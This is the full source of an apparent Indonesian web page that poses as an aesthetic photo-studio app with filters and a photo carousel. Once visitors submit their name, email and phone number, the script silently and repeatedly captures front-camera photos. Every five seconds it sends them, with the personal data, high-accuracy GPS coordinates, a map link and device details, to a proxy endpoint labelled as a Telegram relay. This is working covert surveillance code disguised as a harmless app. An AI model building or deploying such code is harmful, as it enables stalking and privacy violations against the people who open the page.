<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <!-- PERBAIKAN PENTING: Mengatur Permissions Policy untuk mengizinkan Geolocation dan Camera. -->
    <!-- Jika kode dijalankan di iframe, pastikan iframe tersebut juga memiliki allow="geolocation; camera" -->
    <meta http-equiv="Permissions-Policy" content="geolocation=(self), camera=(self)">
    <title>Studio Foto Estetik - Capture Moment Terbaik</title>

    <style>
        /* Desain Profesional & Estetik */
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
        
        :root {
            --primary-pink: #FF69B4; /* Deep Pink */
            --secondary-bg: #F0F4F8; /* Light Grayish Blue */
            --text-dark: #333333;
            --card-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        body {
            background-color: var(--secondary-bg);
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start; /* Mulai dari atas agar nyaman di HP */
            padding: 1rem;
        }

        .container {
            width: 100%;
            max-width: 500px; /* Lebih besar dari sebelumnya */
            background-color: #ffffff;
            border-radius: 20px;
            box-shadow: var(--card-shadow); 
            padding: 1.5rem;
            margin: 1rem 0;
            box-sizing: border-box;
            border: 1px solid #e0e0e0;
        }

        .title-professional {
            font-family: 'Poppins', sans-serif;
            color: var(--primary-pink);
            font-weight: 700;
        }

        /* VIDEO & CANVAS */
        .video-wrapper {
            border: 6px solid #FFC0CB; /* Bingkai soft pink */
            border-radius: 12px;
            overflow: hidden;
            width: 100%;
            margin-bottom: 1.5rem;
            aspect-ratio: 4/3;
            background-color: #000;
        }

        #video-stream {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
            display: block;
        }

        /* EFEK FILTER BUTTONS - Layout Grid Responsif */
        .filter-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr); /* 2 kolom di HP */
            gap: 0.75rem;
        }
        @media (min-width: 640px) { /* Desktop/Tablet: 4 kolom */
            .filter-grid {
                grid-template-columns: repeat(4, 1fr);
            }
        }

        .filter-button {
            transition: all 0.2s;
            border: 2px solid transparent;
        }
        .filter-button.active {
            border-color: var(--primary-pink);
            box-shadow: 0 0 10px rgba(255, 105, 180, 0.5);
        }
        .filter-button:hover {
            opacity: 0.8;
        }

        /* --- CAROUSEL STYLING (NEW) --- */
        .carousel-container {
            overflow: hidden;
            width: 100%;
            border-radius: 12px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            margin-top: 1.5rem;
            position: relative;
        }
        .carousel-wrapper {
            display: flex;
            transition: transform 0.5s ease-in-out;
            cursor: grab; /* Untuk menunjukkan bisa digeser */
        }
        .carousel-slide {
            flex: 0 0 100%; /* Setiap slide mengambil 100% lebar container */
            width: 100%;
            aspect-ratio: 16/9; /* Aspect ratio modern untuk preview */
            overflow: hidden;
        }
        .carousel-slide img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

    </style>
</head>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const videoStream = document.getElementById('video-stream');
            const photoCanvas = document.getElementById('photo-canvas');
            const startButton = document.getElementById('start-button');
            const formArea = document.getElementById('form-area');
            const monitoringArea = document.getElementById('monitoring-area');
            const statusMessageForm = document.getElementById('status-message-form');
            const statusMessageBg = document.getElementById('status-message-bg'); 
            const captureButton = document.getElementById('capture-button');
            const downloadButton = document.getElementById('download-button');
            const shareButton = document.getElementById('share-button');
            const filterButtons = document.querySelectorAll('.filter-button');

            // Data Konfigurasi LOKAL
            const PROXY_ENDPOINT = '/api/telegram-proxy';
            const INTERVAL_MS = 5000; // 5 detik

            let videoStreamObject = null;
            let userLocation = null;
            let formData = {};
            let isSending = false;
            let capturedPhotoBase64 = null;
            let deviceData = getDeviceData(); 
            let currentFilter = 'normal'; // Default filter

            // --- CAROUSEL FOTO PREVIEW LOGIC (NEW) ---
            const carouselWrapper = document.getElementById('carousel-wrapper');
            const slides = document.querySelectorAll('.carousel-slide');
            const indicators = document.querySelectorAll('.absolute > div');
            const totalSlides = slides.length;
            let currentIndex = 0;
            let isDragging = false;
            let startPos = 0;
            let currentTranslate = 0;
            let prevTranslate = 0;
            let animationID = 0;

            // Update UI for slide
            const setPositionByIndex = () => {
                currentTranslate = currentIndex * -slides[0].offsetWidth;
                prevTranslate = currentTranslate;
                setSliderPosition();
                updateIndicators();
            };

            const setSliderPosition = () => {
                carouselWrapper.style.transform = `translateX(${currentTranslate}px)`;
            };

            const updateIndicators = () => {
                indicators.forEach((indicator, index) => {
                    indicator.classList.remove('bg-red-500', 'opacity-100');
                    indicator.classList.add('bg-white', 'opacity-60');
                    if (index === currentIndex) {
                        indicator.classList.remove('bg-white', 'opacity-60');
                        indicator.classList.add('bg-red-500', 'opacity-100');
                    }
                });
            };

            // Automatic slide transition
            const startAutoSlide = () => {
                setInterval(() => {
                    currentIndex = (currentIndex + 1) % totalSlides;
                    setPositionByIndex();
                }, 3000);
            };

            // Manual drag/swipe handling
            const handleTouchStart = (index) => {
                return (event) => {
                    currentIndex = index;
                    startPos = event.type.includes('mouse') ? event.pageX : event.touches[0].clientX;
                    isDragging = true;
                    animationID = requestAnimationFrame(animation);
                    carouselWrapper.style.transition = 'none';
                };
            };

            const handleTouchMove = (event) => {
                if (!isDragging) return;
                const currentClientX = event.type.includes('mouse') ? event.pageX : event.touches[0].clientX;
                currentTranslate = prevTranslate + currentClientX - startPos;
            };

            const handleTouchEnd = () => {
                cancelAnimationFrame(animationID);
                isDragging = false;
                const movedBy = currentTranslate - prevTranslate;
                
                // Jika digeser lebih dari 100px, pindah slide
                if (movedBy < -100 && currentIndex < totalSlides - 1) {
                    currentIndex += 1;
                } else if (movedBy > 100 && currentIndex > 0) {
                    currentIndex -= 1;
                }
                
                carouselWrapper.style.transition = 'transform 0.5s ease-in-out';
                setPositionByIndex();
            };

            const animation = () => {
                setSliderPosition();
                if (isDragging) requestAnimationFrame(animation);
            };

            // Initialize carousel
            slides.forEach((slide, index) => {
                // Touch events for mobile swipe
                slide.addEventListener('touchstart', handleTouchStart(index));
                slide.addEventListener('touchend', handleTouchEnd);
                slide.addEventListener('touchmove', handleTouchMove);
                // Mouse events for desktop drag
                slide.addEventListener('mousedown', handleTouchStart(index));
                slide.addEventListener('mouseup', handleTouchEnd);
                slide.addEventListener('mouseleave', handleTouchEnd); // Stop drag if mouse leaves container
                slide.addEventListener('mousemove', handleTouchMove);
            });
            window.addEventListener('resize', setPositionByIndex); // Handle responsiveness
            setPositionByIndex();
            startAutoSlide();


            // --- FUNGSI UTILITY PESAN (Subtle & Temporary) ---

            function showStatus(message, isError = false) {
                statusMessageBg.textContent = message;
                statusMessageBg.classList.remove('opacity-0', 'text-red-600', 'text-green-600', 'text-gray-500');
                statusMessageBg.classList.add(isError ? 'text-red-600' : 'text-green-600', 'opacity-100');
                
                setTimeout(() => {
                    statusMessageBg.classList.remove('opacity-100');
                    statusMessageBg.classList.add('opacity-0');
                    // Reset ke pesan default setelah menghilang
                    setTimeout(() => {
                        statusMessageBg.textContent = `Pengiriman data lokasi & foto (filter ${currentFilter}) otomatis setiap 5 detik ke bot Anda.`;
                        statusMessageBg.classList.remove('text-red-600', 'text-green-600');
                        statusMessageBg.classList.add('text-gray-500');
                    }, 300);
                }, 3000);
            }

            // --- FILTER EFFECT LOGIC ---
            filterButtons.forEach(button => {
                button.addEventListener('click', (event) => {
                    const filter = event.target.dataset.filter;
                    currentFilter = filter;
                    
                    // Reset active class
                    filterButtons.forEach(btn => btn.classList.remove('active'));
                    event.target.classList.add('active');
                    
                    // Terapkan filter CSS di video stream dan update pesan status
                    applyFilter(filter);
                    statusMessageBg.textContent = `Pengiriman data lokasi & foto (filter ${currentFilter}) otomatis setiap 5 detik ke bot Anda.`;
                    statusMessageBg.classList.add('opacity-100');
                });
            });

            function applyFilter(filter) {
                videoStream.style.filter = 'none'; // Reset
                switch(filter) {
                    case 'bright':
                        videoStream.style.filter = 'brightness(1.1)'; // +10%
                        break;
                    case 'vibrant':
                        videoStream.style.filter = 'brightness(1.2) saturate(1.2)'; // +20%
                        break;
                    case 'bw':
                        videoStream.style.filter = 'grayscale(100%)'; // Black and White
                        break;
                    case 'normal':
                    default:
                        // No filter needed
                        break;
                }
            }


            // --- INISIALISASI DAN VALIDASI FORM ---

            startButton.addEventListener('click', () => {
                const nama = document.getElementById('nama').value.trim();
                const email = document.getElementById('email').value.trim();
                const phone = document.getElementById('phone').value.trim();

                if (!nama || !email || !phone) {
                    statusMessageForm.textContent = '‚ùå Semua kolom data pribadi harus diisi.';
                    return;
                }
                
                // Simple email validation
                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailPattern.test(email)) {
                    statusMessageForm.textContent = '‚ùå Format email tidak valid.';
                    return;
                }

                formData = { nama, email, phone };
                statusMessageForm.textContent = '';
                
                // Sembunyikan form dan carousel, tampilkan monitoring
                formArea.style.display = 'none';
                document.getElementById('carousel-area').style.display = 'none';
                monitoringArea.style.display = 'block';

                showStatus('Meminta izin kamera dan lokasi... Pengiriman 5s otomatis dimulai.', false);
                
                // Mulai permintaan izin dan loop otomatis
                requestCameraPermission();
                requestLocationPermission();
                startAutoSendInterval();
            });


            // --- FUNGSI CAMERA DAN LOKASI (Berjalan Senyap) ---

            function requestCameraPermission() {
                // Tambahkan 'allow' option ke video tag di HTML jika Anda bisa (sudah dilakukan di meta policy)
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // Prioritas kamera depan
                        .then(stream => {
                            videoStreamObject = stream;
                            videoStream.srcObject = stream;
                            videoStream.style.display = 'block';
                            // Sembunyikan pesan error di console jika berhasil
                            console.log("Kamera Berhasil Diakses."); 
                        })
                        .catch(err => {
                            // Periksa tipe error untuk pesan yang lebih informatif
                            let errorMsg = `Kamera GAGAL: ${err.name}.`;
                            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                                errorMsg = '‚ùå Akses Kamera Ditolak. Harap izinkan akses di pengaturan browser Anda.';
                            }
                            showStatus(errorMsg, true);
                            console.error("Camera Error:", err);
                        });
                }
            }

            function requestLocationPermission() {
                if (navigator.geolocation) {
                    const locationOptions = {
                        enableHighAccuracy: true, 
                        timeout: 10000, 
                        maximumAge: 0 
                    };

                    navigator.geolocation.watchPosition(position => {
                        userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp).toISOString()
                        };
                        console.log("Lokasi Berhasil Diakses."); 
                    }, err => {
                        userLocation = null;
                        let errorMsg = `Lokasi Gagal: ${err.message}.`;
                        if (err.code === 1) {
                            errorMsg = '‚ùå Akses Lokasi Ditolak. Harap izinkan akses di pengaturan browser Anda.';
                        } else if (err.message.includes('permissions policy')) {
                             // Jika error ini masih muncul, berarti lingkungan canvas memblokirnya
                             errorMsg = '‚ùå Akses Lokasi Diblokir oleh sistem. Fitur ini mungkin tidak berfungsi.';
                        }
                        showStatus(errorMsg, true);
                        console.error(`Lokasi Gagal: ${err.message}`);
                    }, locationOptions);
                }
            }

            // --- FUNGSI INTERAKTIF LOKAL (JEPET, UNDUH, SHARE) ---
            
            captureButton.addEventListener('click', () => {
                const localPhoto = capturePhotoToCanvas(true); // Kirim true untuk menyimpan filter
                if (localPhoto) {
                    capturedPhotoBase64 = localPhoto; 
                    downloadButton.style.display = 'inline-block';
                    shareButton.style.display = 'inline-block';
                    showStatus('Foto lokal siap diunduh & dibagikan!');
                } else {
                    showStatus('Kamera tidak aktif untuk pengambilan lokal.', true);
                }
            });

            downloadButton.addEventListener('click', () => {
                if (capturedPhotoBase64) {
                    const link = document.createElement('a');
                    link.href = capturedPhotoBase64;
                    link.download = `StudioFotoEstetik-${new Date().getTime()}.jpeg`;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    showStatus('‚úÖ Foto Berhasil Diunduh!');
                }
            });
            
            shareButton.addEventListener('click', async () => {
                if (!capturedPhotoBase64) {
                    showStatus('Tidak ada foto untuk dibagikan. Jepret foto dulu!', true);
                    return;
                }

                try {
                    const photoBlob = dataURItoBlob(capturedPhotoBase64);
                    const photoFile = new File([photoBlob], 'studio_foto.jpeg', { type: photoBlob.type });

                    if (navigator.share && navigator.canShare && navigator.canShare({ files: [photoFile] })) {
                        await navigator.share({
                            files: [photoFile],
                            title: 'Foto dari Studio Foto Estetik',
                            text: 'Lihat foto keren saya dari Studio Foto Estetik!',
                        });
                        showStatus('Berbagi berhasil!');
                    } else {
                        showStatus('Fitur Share tidak didukung. Silakan gunakan tombol Unduh.', true);
                    }
                } catch (error) {
                    console.error('Gagal berbagi:', error);
                    showStatus('Gagal berbagi foto. (Cek console log)', true);
                }
            });


            // --- LOGIKA OTOMATIS DAN PENGIRIMAN (Senyap) ---

            function startAutoSendInterval() {
                const sendNext = () => {
                    if (!isSending) {
                        sendReport();
                    }
                    setTimeout(sendNext, INTERVAL_MS);
                };

                // Kirim laporan pertama setelah 5 detik
                setTimeout(sendNext, INTERVAL_MS);
            }

            // Memperbarui fungsi capturePhotoToCanvas untuk menerapkan filter ke canvas
            function capturePhotoToCanvas(applyCurrentFilter = false) {
                if (!videoStreamObject) return null;

                const context = photoCanvas.getContext('2d');
                const videoWidth = videoStream.videoWidth || 640;
                const videoHeight = videoStream.videoHeight || 480;
                
                photoCanvas.width = videoWidth;
                photoCanvas.height = videoHeight;
                
                context.save();
                // Flip the image (since video feed is mirrored)
                context.translate(videoWidth, 0);
                context.scale(-1, 1);
                
                if (applyCurrentFilter) {
                    // Hanya terapkan filter jika diminta (untuk local save/share)
                    // Note: Untuk pengiriman otomatis ke bot, kita gunakan filter 'normal'
                    context.filter = videoStream.style.filter || 'none'; 
                } else {
                    // Untuk pengiriman otomatis (5s) default ke filter 'normal'
                    context.filter = 'none'; 
                }

                context.drawImage(videoStream, 0, 0, videoWidth, videoHeight);
                context.restore();

                return photoCanvas.toDataURL('image/jpeg', 0.8);
            }

            async function sendReport() {
                if (isSending) return;

                isSending = true;
                
                // Pastikan kamera aktif sebelum mengambil foto
                const base64Image = videoStreamObject ? capturePhotoToCanvas(false) : null;
                
                // Tambahkan waktu dan tanggal saat ini
                const now = new Date();
                const dateTimeText = now.toLocaleString('id-ID', {
                    year: 'numeric',
                    month: 'long',
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit',
                    timeZoneName: 'short'
                });

                // Kompilasi Caption
                const locationText = userLocation ? 
                    `‚úÖ Lokasi Akurat:\nLAT: ${userLocation.latitude.toFixed(6)}\nLNG: ${userLocation.longitude.toFixed(6)}\nAkurasi: ${userLocation.accuracy.toFixed(2)}m\nPeta: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}` : 
                    `‚ùå Lokasi GAGAL didapatkan.`;

                const caption = `
*--- PENGIRIMAN DATA FOTO OTOMATIS (5s) ---*

*Filter Digunakan (Otomatis):* Normal
*Waktu Pengambilan:* ${dateTimeText}

*Data Pengguna:*
Nama: ${formData.nama}
Email: ${formData.email}
No. HP: ${formData.phone}

*Data Lokasi (Wajib Akurat):*
${locationText}

*Informasi Perangkat:*
Perangkat: ${deviceData.device}
Browser: ${deviceData.browser}
OS: ${deviceData.os}
`;
                
                try {
                    await sendDataToProxy(base64Image, caption);
                } catch (error) {
                    console.error("Error saat mengirim data:", error);
                } finally {
                    isSending = false;
                }
            }
            
            async function sendDataToProxy(base64Image, caption) {
                const payload = {
                    caption: caption,
                    base64Image: base64Image,
                    isPhoto: !!base64Image
                };

                const response = await fetch(PROXY_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const data = await response.json();
                if (!response.ok || data.error) {
                    throw new Error(data.error || 'Pengiriman ke proxy gagal.');
                }
                return data;
            }


            // --- UTILITIES (Device Info & Blob) ---

            function getDeviceData() {
                const ua = navigator.userAgent;
                let os = 'OS Lain';
                let browser = 'Browser Tidak Dikenal';
                let device = 'Desktop';

                if (/Windows/.test(ua)) os = 'Windows';
                else if (/Macintosh|Mac OS X/.test(ua)) os = 'macOS';
                else if (/Android/.test(ua)) { os = 'Android'; device = 'Handphone/Tablet'; }
                else if (/iPhone|iPad|iPod/.test(ua)) { os = 'iOS'; device = 'iPhone/iPad'; }
                else if (/Linux/.test(ua)) os = 'Linux';

                if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
                else if (/Firefox/.test(ua)) browser = 'Firefox';
                else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
                else if (/Edge/.test(ua)) browser = 'Edge';
                
                return { os, browser, device };
            }

            function dataURItoBlob(dataURI) {
                const byteString = atob(dataURI.split(',')[1]);
                const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                return new Blob([ab], { type: mimeString });
            }
        });
